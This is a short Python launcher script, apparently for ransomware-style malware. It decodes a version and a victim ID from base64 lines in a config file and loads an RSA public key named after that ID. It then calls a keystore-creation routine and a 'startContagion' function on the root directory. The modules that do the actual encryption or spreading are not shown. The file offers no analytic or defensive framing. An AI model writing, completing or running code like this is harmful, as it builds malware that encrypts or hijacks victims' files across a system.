from base64 import b64decode

import starter
import guiMode
from utils import root_directory

with open("config.txt","r") as configFile:
    version = b64decode(configFile.readline()).strip().decode("utf-8")
    what_is_my_id = b64decode(configFile.readline()).strip().decode("utf-8")

rsa_public_key = open(str(what_is_my_id)+"_rsa_public_key.pub","r").read()

starter.keyStoreCreate(version, what_is_my_id)
starter.startContagion(root_directory, rsa_public_key)